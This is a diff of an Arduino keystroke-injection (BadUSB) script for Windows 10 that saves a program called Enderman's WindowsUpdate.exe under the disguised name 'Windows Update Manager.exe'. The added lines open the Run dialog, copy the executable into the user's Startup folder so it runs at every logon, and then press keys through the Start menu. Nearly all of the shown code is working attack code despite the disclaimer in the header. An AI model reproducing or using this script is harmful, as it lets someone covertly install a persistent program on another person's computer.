@@ -1,7 +1,7 @@
 /**
  * AUTHOR: Eddie Devine
  * TARGET: Windows 10
- * DESCRIPTION: Installs ands runs Enderman's WindowsUpdate.exe.
+ * DESCRIPTION: Installs to startup and runs Enderman's WindowsUpdate.exe.
  * DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
  
  * Made with Duckuino, an open-source project.
@@ -147,7 +147,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print(F("$outpath = \"C:\\Windows_Update_Manager.exe\""));
+  Keyboard.print(F("$outpath = \"C:\\Windows Update Manager.exe\""));
 
   typeKey(KEY_RETURN);
 
@@ -156,19 +156,40 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(1000);
-  Keyboard.print(F("cd .."));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("cd.."));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("start Windows_Update_Manager.exe"));
-
-  typeKey(KEY_RETURN);
-
   Keyboard.print(F("exit"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(500);
+  Keyboard.print(F("cmd /c copy \"C:\\Windows Update Manager.exe\" \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""));
+
+  typeKey(KEY_RETURN);
+
+  typeKey(KEY_LEFT_GUI);
+
+  delay(100);
+  typeKey(KEY_TAB);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
 
   typeKey(KEY_RETURN);
 
